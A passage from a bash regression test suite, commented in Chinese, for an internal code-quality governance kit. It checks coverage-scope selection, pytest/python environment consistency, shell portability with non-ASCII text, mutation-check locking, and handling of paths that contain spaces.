  say "✅ PASS  用例13d kit 自检模式不豁免 (rc=$rc13d)"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例13d kit 内被误豁免 rc=$rc13d"; FAIL=$((FAIL+1))
  printf '%s\n' "$out13d" | tail -8
fi


# ── 用例14: 摩擦预算回归（1-2h）——纯 shell 载体批次不得触发 Python 全量覆盖率 ─────────
# 实证（OODA-20261015-011）：ai-weight 一次 ai-guard+review-token 的 L2 提交实测 ≈140 s，
# 其报表 20261015-160923-gate-L2.md 显示「tests 全量 核心≥56% 分支=44.1%」。
# 复现同一调用（已同步的 kit 载体）实测 1.45 s、scope=changed。
# 判定：140 s 属**旧载体**行为（该报表无「阈值来源」/「覆盖率口径」两行 ⇒ 非新版口径），
# 已由 1-1a 载体同步消解。本用例防「全量口径被重新引入」这一摩擦回归。
r14="$(new_repo)"
mkdir -p "$r14/scripts/ai-verify"
cp "$SYNC_SRC/quality-gate.sh" "$r14/scripts/ai-verify/quality-gate.sh"
cp "$SYNC_SRC/mutation-check.sh" "$r14/scripts/ai-verify/mutation-check.sh"
cp "$SYNC_SRC/risk-classify.sh" "$r14/scripts/ai-verify/risk-classify.sh"
printf '60\ttests\tsrc\n' > "$r14/.ai-coverage-threshold"
# 复现真实仓形态：有 pytest 配置（否则门禁在「无测试配置」处提前返回，测不到口径判定）
printf '[tool.pytest.ini_options]\ntestpaths = ["tests"]\n' > "$r14/pyproject.toml"
mkdir -p "$r14/tests"
out14="$( cd "$r14" && PYTHON_BIN="${PYTHON_BIN:-python3}" bash scripts/ai-verify/quality-gate.sh L2 scripts/ai-verify/ai-guard.sh scripts/ai-verify/review-token.sh 2>&1 )"
if printf '%s' "$out14" | grep -q 'scope=changed' \
   && ! printf '%s' "$out14" | grep -q '全量'; then
  say "✅ PASS  用例14 纯 shell 载体批次走 changed 口径（未触发全量覆盖率，摩擦预算未回归）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例14 纯 shell 批次触发全量覆盖率（1-2h 摩擦回归）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out14" | tail -8
fi



# ── 用例15: U1 工具运行时不变式（I-tools）——同名变量不得异义／异环境 ────────────────
# 背景（OODA-20261015-011）：su-memory-sdk 以 PYTEST_BIN 表示「运行 pytest 的解释器」，
# kit 表示「pytest 可执行文件」——**同一键两种语义**；该仓又以「字符串不等」判「不一致」，
# 于是 kit 的**同环境**注入（.venv/bin/pytest ＋ .venv/bin/python）被自己人拦掉，
# 直接把一个能提交的仓变成提交不了的仓（实证 20261015-170802-gate-L2.md）。
# 不变式: pytest 与 python 必须**同属一个解释器环境**；判据是「同 bin 目录」，不是字符串相等。
venv_x="$TROOT/venv-x"; venv_y="$TROOT/venv-y"
mkdir -p "$venv_x" "$venv_y"
for _vd in "$venv_x" "$venv_y"; do
  printf '#!/bin/sh\necho pytest 9.9.9\n' > "$_vd/pytest"
  printf '#!/bin/sh\necho Python 3.11\n' > "$_vd/python"
  chmod +x "$_vd/pytest" "$_vd/python"
done
r15="$(new_repo)"
mkdir -p "$r15/scripts/ai-verify" "$r15/tests"
cp "$SYNC_SRC/quality-gate.sh" "$r15/scripts/ai-verify/quality-gate.sh"
printf '[tool.pytest.ini_options]\ntestpaths = ["tests"]\n' > "$r15/pyproject.toml"
git -C "$r15" add -A >/dev/null 2>&1; git -C "$r15" commit -qm case15 >/dev/null 2>&1
# 15a: 异环境（pytest 在 X、python 在 Y）⇒ 必须 fail-closed
out15a="$( cd "$r15" && PYTEST_BIN="$venv_x/pytest" PYTHON_BIN="$venv_y/python" bash scripts/ai-verify/quality-gate.sh L2 scripts/ai-verify/quality-gate.sh 2>&1 )"; rc15a=$?
if [ "$rc15a" -ne 0 ] && printf '%s' "$out15a" | grep -q '工具运行时不一致'; then
  say "✅ PASS  用例15a 异环境 pytest/python 被 fail-closed 拦截 (rc=$rc15a)"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例15a 异环境未被拦截 rc=$rc15a"; FAIL=$((FAIL+1))
  printf '%s\n' "$out15a" | tail -8
fi
# 15b: 同环境（同一 venv 的 pytest ＋ python，字符串必然不等）⇒ 不得误报
out15b="$( cd "$r15" && PYTEST_BIN="$venv_x/pytest" PYTHON_BIN="$venv_x/python" bash scripts/ai-verify/quality-gate.sh L2 scripts/ai-verify/quality-gate.sh 2>&1 )"
if ! printf '%s' "$out15b" | grep -q '工具运行时不一致' \
   && ! printf '%s' "$out15b" | grep -q '工具完整性校验未通过'; then
  say "✅ PASS  用例15b 同环境注入未被误报（越过工具校验阶段）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例15b 同环境被误判为不一致（同名异义假红回归）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out15b" | tail -8
fi
# 15d/15e: 「半套显式」必须被补全为同环境一组（OODA-20261015-AIGUARD-KITSYNC-011）
# 实证：开发者全局 export PYTEST_BIN=<系统 pytest> ＋ 仓库另有 venv 时，旧逻辑把
# PYTHON_BIN 指向 venv ⇒ 基础层自己造出「运行时不一致」，9 仓 L2 提交被自己拦下。
PAIR_FN="$(awk '/^pin_tool_env_pair\(\)\{/,/^\}/' "$SYNC_SRC/ai-guard.sh")"
mkdir -p "$venv_x/../pairvenv/bin"; cp "$venv_x/pytest" "$venv_x/../pairvenv/bin/pytest"; cp "$venv_x/python" "$venv_x/../pairvenv/bin/python"
chmod +x "$venv_x/../pairvenv/bin/pytest" "$venv_x/../pairvenv/bin/python"
o15d="$( env -u PYTHON_BIN PYTEST_BIN="$venv_x/pytest" bash -c "$PAIR_FN"'; pin_tool_env_pair; printf "%s" "${PYTHON_BIN:-}"' 2>/dev/null )"
if [ "$o15d" = "$venv_x/python" ]; then
  say "✅ PASS  用例15d 只显式 PYTEST_BIN ⇒ 派生同环境 python（不再自造不一致）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例15d 半套显式未补全（got=${o15d:-空}）"; FAIL=$((FAIL+1))
fi
o15e="$( env -u PYTEST_BIN PYTHON_BIN="$venv_x/../pairvenv/bin/python" bash -c "$PAIR_FN"'; pin_tool_env_pair; printf "%s" "${PYTEST_BIN:-}"' 2>/dev/null )"
if [ "$o15e" = "$venv_x/../pairvenv/bin/pytest" ]; then
  say "✅ PASS  用例15e 只显式 PYTHON_BIN ⇒ 派生同 venv pytest"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例15e 反向补全失败（got=${o15e:-空}）"; FAIL=$((FAIL+1))
fi
# 15c: 裸命令名（PATH 解析）⇒ 无从判定归属，不得误报
out15c="$( cd "$r15" && PYTEST_BIN=pytest bash scripts/ai-verify/quality-gate.sh L2 scripts/ai-verify/quality-gate.sh 2>&1 )"
if ! printf '%s' "$out15c" | grep -q '工具运行时不一致'; then
  say "✅ PASS  用例15c 裸命令名不触发环境判定（不误报）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例15c 裸命令名被误判"; FAIL=$((FAIL+1))
fi


# ── 用例16: shell 可移植性 —— `$VAR` 紧邻非 ASCII ─────────────────────────────────
# 实证（OODA-20261015-AIGUARD-KITSYNC-011）：`PYTHON_BIN=$PYTHON_BIN）` 这种写法在
# 本机 bash 下把变量名的解析越过多字节字符边界，**整个变量值被吞掉**——门禁报出
# 「PYTHON_BIN=）」而看不到真实值，定位成本极高；且属静默失真（不报错、只错内容）。
# 该缺陷此前只有 hospital 仓自查（其 pre-commit 有同名检查），属基础层应固化项。
# 2026-10-15 扩围：只扫顶层 *.sh 会漏掉 tests/ 子目录——hospital 的更严口径当场抓出
# 本套件自身一处同类写法（用例17b），故扫描范围并入 tests/*.sh（唯一实现＝
# nutrition-system-hospital/scripts/ai-verify/shell_portability.py，本用例为其轻量同口径副本）。
bad16="$(LC_ALL=C grep -n '\$[A-Za-z_][A-Za-z0-9_]*[^ -~]' "$SYNC_SRC"/*.sh "$SYNC_SRC"/tests/*.sh 2>/dev/null \
          | grep -vE '^[^:]*:[0-9]+:[[:space:]]*#' || true)"
if [ -z "$bad16" ]; then
  say "✅ PASS  用例16 治理脚本无「\$VAR 紧邻非 ASCII」写法"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例16 发现 \$VAR 紧邻非 ASCII（值会被吞字节）"; FAIL=$((FAIL+1))
  printf '%s\n' "$bad16" | head -10
fi

# ── 用例17: mutation-check 双向合并接口（§15.7-1，OODA-20261015-AIGUARD-MUTMERGE-015）──
# 实证：kit 与 su-memory 的 mutation-check 是**双向分叉**（两侧都不是子集）——kit 独有
# 逗号多目标/`git diff HEAD` 行号口径/MUTATION_SCOPE/语法破坏跳过；su 独有并发互斥/
# shlex 前缀解析/证据链 JSON。硬覆盖任一方向都丢能力。合并后必须钉死「两侧能力同时在场」，
# 否则下一次「从某一侧同步」会静默退回半套，且退回方向不同、症状也不同。
MC="$SYNC_SRC/mutation-check.sh"
miss17=""
for needle in acquire_lock write_mutation_report MUTATION_SKIP_RES shlex \
              MUTATION_SCOPE parse_selected_tests in_line_skip MUTATION_DIFF_BASE \
              'sys.exit(3)' MUTATION_NA_REASON repo-scoped-mkdir-exclusive \
              MUTATION_EVIDENCE_WORKSPACE skip_allowlist_approved; do
  grep -qF -- "$needle" "$MC" || miss17="$miss17 $needle"
done
if [ -z "$miss17" ]; then
  say "✅ PASS  用例17a 合并接口齐全（kit 骨架能力 + su 三块能力同时在场）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例17a 合并能力缺失:$miss17"; FAIL=$((FAIL+1))
fi

# 用例17b: 活锁并发必须 fail-closed（等待上限 0 ⇒ 立即 rc=2，不静默双跑）
r17="$(mktemp -d)"
mkdir -p "$r17/.ai-governance/reports/locks/mutation-check.lock"
cat > "$r17/target.py" <<'PYT17'
def f(x):
    return x
PYT17
printf '%s\n' "$$" > "$r17/.ai-governance/reports/locks/mutation-check.lock/pid"
out17="$( cd "$r17" && MUTATION_LOCK_WAIT=0 bash "$MC" "$r17/target.py" "$r17/target.py" 2>&1 )"; rc17=$?
if [ "$rc17" -eq 2 ] && printf '%s' "$out17" | grep -q '禁止并发运行'; then
  say "✅ PASS  用例17b 活锁并发被 fail-closed（rc=2，不静默双跑）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例17b 活锁未 fail-closed（rc=${rc17}）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out17" | tail -3
fi
rm -rf "$r17"

# 用例17c: 单目标解析必须「整串即一个目标」——绝对路径含空格时不得按空白切分
# 实证（2026-10-15 回归，OODA-20261015-AIGUARD-MUTMERGE-015 附带）：合并件把无逗号
# 分支退回「shlex 空白切分」，而本仓仓根 `/Users/mac/qoder m5pro` 含空格 ⇒ 单目标
# 绝对路径被劈成 `/Users/mac/qoder` 与 `m5pro/...` 两条，pytest 报
# `file or directory not found`、门禁假红（`no tests ran in 0.00s` + 覆盖率 0%）。
# 判据：含空格的单目标路径必须整串生效（基准通过且无 not found）。该路径不在 git 仓内，
# 故显式 MUTATION_SCOPE=all；关锁避免与套件其它用例争用。
r17c="$(mktemp -d)/dir with space"
mkdir -p "$r17c/src" "$r17c/tests"
cat > "$r17c/src/calc.py" <<'PYT17C'
def is_over(x, cap):
    return x >= cap


def scaled(x, k):
    return x + k
PYT17C
cat > "$r17c/tests/test_calc.py" <<'PYT17C'
from src.calc import is_over, scaled


def test_is_over():
    assert is_over(5, 5) is True
    assert is_over(4, 5) is False


def test_scaled():
    assert scaled(2, 3) == 5
PYT17C
: > "$r17c/src/__init__.py"; : > "$r17c/tests/__init__.py"
out17c="$( cd "$r17c" && PYTHONPATH="$r17c" MUTATION_SCOPE=all MUTATION_LOCK=0 \
  bash "$MC" "$r17c/src/calc.py" "$r17c/tests/test_calc.py" 2>&1 )"; rc17c=$?
if [ "$rc17c" -eq 0 ] && printf '%s' "$out17c" | grep -q '基准通过' \
   && ! printf '%s' "$out17c" | grep -q 'file or directory not found'; then
  say "✅ PASS  用例17c 含空格单目标整串生效（rc=0，未被空白切分）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例17c 含空格单目标被切分（rc=${rc17c}）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out17c" | tail -5
fi
rm -rf "${r17c%/dir with space}"

echo
[ "$SKIP" -gt 0 ] && say "（SKIP=阶段2待修项, 不阻断阶段0合入）"
say "汇总: PASS=$PASS FAIL=$FAIL SKIP=$SKIP"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
